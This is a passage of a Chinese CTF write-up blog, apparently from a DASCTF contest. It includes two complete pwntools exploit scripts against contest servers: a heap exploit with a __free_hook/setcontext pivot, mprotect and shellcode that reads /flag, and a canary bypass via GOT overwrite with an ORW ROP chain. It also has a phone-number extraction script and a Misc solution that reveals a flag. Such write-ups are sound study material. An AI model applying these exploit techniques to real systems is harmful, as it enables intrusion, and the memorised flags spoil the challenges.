class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*  <br>elf=ELF(<span class="hljs-string">&#x27;./ezheap&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./ezheap&#x27;) </span><br>p=remote(<span class="hljs-string">&#x27;139.155.126.78&#x27;</span>,<span class="hljs-number">32467</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):<br>    p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>):<br>    p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):<br>    p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>):<br>    p.sendlineafter(a, b)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">li</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(a))     <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():<br>    p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>():<br>    <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():<br>    p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_32</span>():<br>    <span class="hljs-keyword">return</span> u32(p.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>():<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():<br>    gdb.attach(p)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">i</span>):<br>    sla(<span class="hljs-string">b&#x27;Your choice:&#x27;</span>,<span class="hljs-built_in">str</span>(i))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,size</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">b&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">b&#x27;Size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">b&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    cmd(<span class="hljs-number">4</span>)    <br>    sla(<span class="hljs-string">b&#x27;choose:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,con</span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">b&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">b&#x27;context:&#x27;</span>,con)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>)  <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)  <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x18</span>)  <span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p8(<span class="hljs-number">0xe1</span>))<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xd8</span>)  <br>show(<span class="hljs-number">4</span>)<br>rl(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>pie=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x202160</span><br>li(pie)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x68</span>+p64(<span class="hljs-number">0x71</span>)+p64(pie+<span class="hljs-number">0x202020</span>)) <br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">7</span>,p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libc_base=get_addr()-<span class="hljs-number">0x3ed8b0</span><br>li(libc_base)<br><br>rdi = libc_base+libc.search(asm(<span class="hljs-string">&quot;pop rdi\nret&quot;</span>)).__next__()<br>rsi = libc_base+libc.search(asm(<span class="hljs-string">&quot;pop rsi\nret&quot;</span>)).__next__()<br>rdx = libc_base+libc.search(asm(<span class="hljs-string">&quot;pop rdx\nret&quot;</span>)).__next__()<br>rax = libc_base+libc.search(asm(<span class="hljs-string">&quot;pop rax\nret&quot;</span>)).__next__()<br>ret = libc_base+libc.search(asm(<span class="hljs-string">&quot;ret&quot;</span>)).__next__()<br>syscall=libc_base+libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>)).__next__()<br>jmp_rsp=libc_base+libc.search(asm(<span class="hljs-string">&quot;jmp rsp&quot;</span>)).__next__()<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext=libc_base+libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]+<span class="hljs-number">53</span><br>open_addr=libc_base+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr=libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr=libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload=(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x68</span>+p64(<span class="hljs-number">0</span>)+p64(free_hook&amp;<span class="hljs-number">0xfffffffffffff000</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(<span class="hljs-number">0x2000</span>)).ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(free_hook&amp;<span class="hljs-number">0xfffffffffffff000</span>)+p64(syscall)<br><br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x18</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x18</span>)<br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p8(<span class="hljs-number">0xc1</span>))<br>free(<span class="hljs-number">9</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0xb8</span>)<br>free(<span class="hljs-number">10</span>)<br>edit(<span class="hljs-number">12</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x58</span>+p64(<span class="hljs-number">0x61</span>)+p64(free_hook)) <br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">14</span>,<span class="hljs-number">0x58</span>)<br>edit(<span class="hljs-number">14</span>,p64(setcontext))<br>add(<span class="hljs-number">15</span>,<span class="hljs-number">0x400</span>)<br>edit(<span class="hljs-number">15</span>,payload)<br><br>free(<span class="hljs-number">15</span>)<br>payload  = p64(rdi)+p64(free_hook&amp;<span class="hljs-number">0xfffffffffffff000</span>)<br>payload += p64(rsi)+p64(<span class="hljs-number">0x1000</span>)<br>payload += p64(rdx)+p64(<span class="hljs-number">7</span>)<br>payload += p64(rax)+p64(<span class="hljs-number">10</span>)<br>payload += p64(syscall) <span class="hljs-comment">#mprotect(free_hook&amp;0xfffffffffffff000,0x1000,7)</span><br>payload += p64(jmp_rsp)<br>payload += asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>payload += asm(shellcraft.read(<span class="hljs-number">3</span>,free_hook+<span class="hljs-number">0x300</span>,<span class="hljs-number">0x30</span>))<br>payload += asm(shellcraft.write(<span class="hljs-number">1</span>,free_hook+<span class="hljs-number">0x300</span>,<span class="hljs-number">0x30</span>))<br><br>sl(payload)<br><br>inter()<br></code></pre></td></tr></table></figure><h3 id="2-2"><a href="#2-2" class="headerlink" title="2-2"></a>2-2</h3><p>Inequable_Canary</p><p>观察ida</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908805.png" alt="img"></p><p>同时看到题目给了有jmp rsp的gadget，限制了execve系统调用，需要orw，一开始思路就是往栈上写入shellcode然后跳转过去执行在vuln函数中还有个任意地址写8字节，因为buf读入的数据长度是0x10,因此可以覆盖到v3，sys_read(0, v3, 8uLL);就是任意地址写8字节因为没有leak的途径，因此显然需要利用这个任意地址写8字节来覆盖stack_fail_got为一个函数，进而绕过canary同时注意这里的v4是rsp+0x20，所以我一直没找到合适的方法来控制rsp指向shellcode进而jmp rsp，所以需要改变思路我们可以覆盖stack_fail_got为一个pop 3;ret，这样就可以执行v4读入的ROP链写leak出libcbase，同时再一次进入vuln函数利用这个任意地址写8字节往bss写入’flag\x00\x00\x00\x00’字符串，然后再次执行v4读入的ROP链进行ORW就打通了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">import</span> ctypes<br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;139.155.126.78&#x27;</span>,<span class="hljs-number">29348</span>)<br><span class="hljs-comment">#p=process(&#x27;./canary&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./canary&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bug</span>():  gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):<br>    p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a,b</span>):<br>    p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):<br>    p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a,b</span>):<br>    p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>(<span class="hljs-params">a</span>):<br>    p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():<br>    p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr64</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr32</span>():<br>    <span class="hljs-keyword">return</span> u32(p.recvuntil(<span class="hljs-string">&quot;\xf7&quot;</span>)[-<span class="hljs-number">4</span>:])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>():<br>    <span class="hljs-keyword">return</span> libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>).__next__()<br>li = <span class="hljs-keyword">lambda</span> x : <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br>ll = <span class="hljs-keyword">lambda</span> x : <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br>vuln=<span class="hljs-number">0x400820</span><br>stack_fail_got=<span class="hljs-number">0x601038</span><br><span class="hljs-comment"># dbg()</span><br>sa(<span class="hljs-string">&quot;Say some old spells to start the journey\n&quot;</span>,p64(vuln))<br><br>sa(<span class="hljs-string">&quot;Tell me the location of the Eye of the Deep Sea\n&quot;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(stack_fail_got))<br>sa(<span class="hljs-string">&quot;I have magic\n&quot;</span>,p64(<span class="hljs-number">0x400a5f</span>)) <span class="hljs-comment">#pop 3</span><br><br>pop_rdi=<span class="hljs-number">0x400a63</span><br>pop_rsi_r15=<span class="hljs-number">0x400a61</span><br>read_got=<span class="hljs-number">0x601040</span><br>write_addr=<span class="hljs-number">0x4006E0</span><br>payload=p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="hljs-number">0</span>)+p64(write_addr)+p64(vuln)<br>sa(<span class="hljs-string">&quot;Let&#x27;s go!\n&quot;</span>,payload)<br><br>libc_base=u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x10e1e0</span><br>li(<span class="hljs-built_in">hex</span>(libc_base))<br><br>bss=<span class="hljs-number">0x601060</span>+<span class="hljs-number">0x800</span><br>sa(<span class="hljs-string">&quot;Tell me the location of the Eye of the Deep Sea\n&quot;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(bss))<br>sa(<span class="hljs-string">&quot;I have magic\n&quot;</span>,<span class="hljs-string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>) <span class="hljs-comment">#pop 3</span><br>pop_rdi=<span class="hljs-number">0x400a63</span><br>pop_rsi_r15=<span class="hljs-number">0x400a61</span><br>read_got=<span class="hljs-number">0x601040</span><br>write_addr=<span class="hljs-number">0x4006E0</span><br>pop_rax=libc_base+<span class="hljs-number">0x36174</span><br>pop_rdx_r12=libc_base+<span class="hljs-number">0x119431</span> <br>syscall_ret=libc_base+<span class="hljs-number">0x47656</span> <span class="hljs-comment">#syscall pop_rbp ret</span><br>payload=p64(pop_rdi)+p64(bss)+p64(pop_rsi_r15)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(pop_rax)+p64(<span class="hljs-number">2</span>)+p64(syscall_ret)+p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#open</span><br>payload+=p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x100</span>)*<span class="hljs-number">2</span>+p64(pop_rdx_r12)+p64(<span class="hljs-number">0x100</span>)*<span class="hljs-number">2</span>+p64(pop_rax)+p64(<span class="hljs-number">0</span>)+p64(syscall_ret)+p64(<span class="hljs-number">0</span>)<span class="hljs-comment">#read</span><br>payload+=p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_r15)+p64(bss+<span class="hljs-number">0x100</span>)*<span class="hljs-number">2</span>+p64(pop_rdx_r12)+p64(<span class="hljs-number">0x100</span>)*<span class="hljs-number">2</span>+p64(pop_rax)+p64(<span class="hljs-number">1</span>)+p64(syscall_ret)+p64(<span class="hljs-number">0</span>)<br>sa(<span class="hljs-string">&quot;Let&#x27;s go!\n&quot;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure><h2 id="DS"><a href="#DS" class="headerlink" title="DS"></a>DS</h2><h3 id="3-1"><a href="#3-1" class="headerlink" title="3-1"></a>3-1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_phone_numbers</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-comment"># 定义有效的手机号码前缀</span><br>    valid_prefixes = (<br>        <span class="hljs-string">&#x27;734&#x27;</span>, <span class="hljs-string">&#x27;735&#x27;</span>, <span class="hljs-string">&#x27;736&#x27;</span>, <span class="hljs-string">&#x27;737&#x27;</span>, <span class="hljs-string">&#x27;738&#x27;</span>, <span class="hljs-string">&#x27;739&#x27;</span>, <span class="hljs-string">&#x27;747&#x27;</span>, <span class="hljs-string">&#x27;748&#x27;</span>, <span class="hljs-string">&#x27;750&#x27;</span>, <span class="hljs-string">&#x27;751&#x27;</span>,<br>        <span class="hljs-string">&#x27;752&#x27;</span>, <span class="hljs-string">&#x27;757&#x27;</span>, <span class="hljs-string">&#x27;758&#x27;</span>, <span class="hljs-string">&#x27;759&#x27;</span>, <span class="hljs-string">&#x27;772&#x27;</span>, <span class="hljs-string">&#x27;778&#x27;</span>, <span class="hljs-string">&#x27;782&#x27;</span>, <span class="hljs-string">&#x27;783&#x27;</span>, <span class="hljs-string">&#x27;784&#x27;</span>, <span class="hljs-string">&#x27;787&#x27;</span>,<br>        <span class="hljs-string">&#x27;788&#x27;</span>, <span class="hljs-string">&#x27;795&#x27;</span>, <span class="hljs-string">&#x27;798&#x27;</span>, <span class="hljs-string">&#x27;730&#x27;</span>, <span class="hljs-string">&#x27;731&#x27;</span>, <span class="hljs-string">&#x27;732&#x27;</span>, <span class="hljs-string">&#x27;740&#x27;</span>, <span class="hljs-string">&#x27;745&#x27;</span>, <span class="hljs-string">&#x27;746&#x27;</span>, <span class="hljs-string">&#x27;755&#x27;</span>,<br>        <span class="hljs-string">&#x27;756&#x27;</span>, <span class="hljs-string">&#x27;766&#x27;</span>, <span class="hljs-string">&#x27;767&#x27;</span>, <span class="hljs-string">&#x27;771&#x27;</span>, <span class="hljs-string">&#x27;775&#x27;</span>, <span class="hljs-string">&#x27;776&#x27;</span>, <span class="hljs-string">&#x27;785&#x27;</span>, <span class="hljs-string">&#x27;786&#x27;</span>, <span class="hljs-string">&#x27;796&#x27;</span>, <span class="hljs-string">&#x27;733&#x27;</span>,<br>        <span class="hljs-string">&#x27;749&#x27;</span>, <span class="hljs-string">&#x27;753&#x27;</span>, <span class="hljs-string">&#x27;773&#x27;</span>, <span class="hljs-string">&#x27;774&#x27;</span>, <span class="hljs-string">&#x27;777&#x27;</span>, <span class="hljs-string">&#x27;780&#x27;</span>, <span class="hljs-string">&#x27;781&#x27;</span>, <span class="hljs-string">&#x27;789&#x27;</span>, <span class="hljs-string">&#x27;790&#x27;</span>, <span class="hljs-string">&#x27;791&#x27;</span>,<br>        <span class="hljs-string">&#x27;793&#x27;</span>, <span class="hljs-string">&#x27;799&#x27;</span>  <span class="hljs-comment"># 确保这个列表是完整的</span><br>    )<br>    <br>    <span class="hljs-comment"># 创建正则表达式模式，提取以有效前缀开头的完整手机号码</span><br>    pattern = <span class="hljs-string">r&#x27;(?&lt;!\d)(&#x27;</span> + <span class="hljs-string">&#x27;|&#x27;</span>.join(valid_prefixes) + <span class="hljs-string">r&#x27;)(\d&#123;8&#125;)(?!\d)&#x27;</span><br>    matches = re.findall(pattern, text)<br>    <br>    <span class="hljs-comment"># 返回完整的手机号码</span><br>    <span class="hljs-keyword">return</span> [prefix + number <span class="hljs-keyword">for</span> prefix, number <span class="hljs-keyword">in</span> matches]<br><br><span class="hljs-comment"># 读取txt文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_txt_file</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-keyword">return</span> file.read()<br><br><span class="hljs-comment"># 将提取的手机号码保存到CSV文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_to_csv</span>(<span class="hljs-params">phone_numbers, output_file</span>):<br>    df = pd.DataFrame(phone_numbers, columns=[<span class="hljs-string">&#x27;手机号码&#x27;</span>])<br>    df.to_csv(output_file, index=<span class="hljs-literal">False</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;提取的手机号码: <span class="hljs-subst">&#123;phone_numbers&#125;</span>&#x27;</span>)  <span class="hljs-comment"># 输出提取的手机号码</span><br><br><span class="hljs-comment"># 主函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    input_file = <span class="hljs-string">&#x27;data.txt&#x27;</span>  <span class="hljs-comment"># 这里替换为你的txt文件路径</span><br>    output_file = <span class="hljs-string">&#x27;output.csv&#x27;</span>  <span class="hljs-comment"># 这里替换为你想要保存的CSV文件路径</span><br><br>    <span class="hljs-comment"># 读取文件内容</span><br>    content = read_txt_file(input_file)<br>    <br>    <span class="hljs-comment"># 提取手机号码</span><br>    phone_numbers = extract_phone_numbers(content)<br>    <br>    <span class="hljs-comment"># 保存到CSV</span><br>    save_to_csv(phone_numbers, output_file)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;手机号码已成功保存到 <span class="hljs-subst">&#123;output_file&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># 运行主函数</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908236.png" alt="img"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="4-1"><a href="#4-1" class="headerlink" title="4-1"></a>4-1</h3><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908276.png" alt="img"></p><p>密码MD5取前16位为key值</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908428.png" alt="img"></p><ul><li>key值a18551e65c48f51e</li><li>追踪流</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908014.png" alt="img"></p><p>e71f50e9773b23f9LrM9NTFlNjVjNzMUQDpsVT1KegABTTk60LjI68X66lH9Fno8gpF7BylFz2ua+exRPZO&#x2F;n8PIOgZrx3NtgYSAYzF2bbOMUDY1Yw&#x3D;&#x3D;792dea3a7ae385ca</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908289.png" alt="img"></p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908715.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">DASCTF&#123;M0Y_W1sh_Y0u_LogF1le_Usg32WEM&#125;<br></code></pre></td></tr></table></figure><h3 id="4-2"><a href="#4-2" class="headerlink" title="4-2"></a>4-2</h3><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412201908752.png" 